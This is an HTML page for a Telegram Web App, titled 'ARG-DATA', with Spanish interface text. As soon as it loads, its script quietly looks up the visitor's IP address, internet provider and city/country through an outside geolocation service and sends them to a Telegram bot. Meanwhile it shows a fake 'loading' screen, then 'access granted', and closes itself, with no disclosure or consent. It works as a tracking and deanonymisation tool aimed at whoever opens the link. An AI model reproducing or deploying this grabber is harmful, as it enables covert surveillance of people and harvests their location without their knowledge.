<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ARG-DATA</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:50px; font-family:monospace;">
    <h2>SISTEMA ARG-DATA</h2>
    <p id="status">CARGANDO RECURSOS...</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function capturar() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                // Enviamos los datos al bot a través de Telegram (Método oficial)
                tg.sendData(JSON.stringify({
                    ip: data.ip,
                    isp: data.org,
                    loc: `${data.city}, ${data.country_name}`
                }));

                document.getElementById('status').innerText = "ACCESO CONCEDIDO";
                setTimeout(() => { tg.close(); }, 1500);
            } catch (e) {
                document.getElementById('status').innerText = "ERROR DE RED";
            }
        }
        window.onload = capturar;
    </script>
</body>
</html>
